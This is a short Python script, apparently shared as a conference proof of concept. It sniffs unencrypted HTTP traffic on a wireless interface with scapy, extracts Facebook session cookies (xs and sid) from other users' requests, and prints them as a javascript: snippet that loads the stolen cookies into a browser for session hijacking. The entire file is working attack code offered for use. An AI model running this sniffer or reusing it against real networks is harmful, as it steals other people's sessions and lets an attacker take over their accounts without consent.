#!/usr/bin/env python

# Facebook session cookie grabber
# Karagasidis "gatoni" Dimitris, http://gatoni.gr
# For 0x375 0x03

# Notes:
# This is just a little proof of concept code. There is
# room for improvement and optimization. A better analysis
# of facebook cookies and some more checks can eliminate
# the false positives (they usually have lots of urlencoded
# characters in the end).

import logging
logging.getLogger( "scapy.runtime" ).setLevel( logging.ERROR )
from scapy.all import *

def processPacket( pkt ):
	cookie = "javascript:"
	if Raw in pkt:
		data = pkt[Raw].load
		if data.find( "GET" ) != -1 and data.find( "Cookie" ) != -1:
			if data.find( "xs=" ) == -1 or data.find( "sid=" ) == -1:
				return
			for opt in data.split("\r\n"):
				if opt.startswith( "Cookie:" ):
					opt = opt.split( ": ")[1]
					for kv in opt.split(";"):
						cookie += 'document.cookie="' + kv.strip() + '";'
					cookie += "alert('Done.');"
					print "\n[+] Smells like session cookie..."
					print cookie
					return

sniff( prn=processPacket, filter="tcp and port 80", iface="wlan0" )

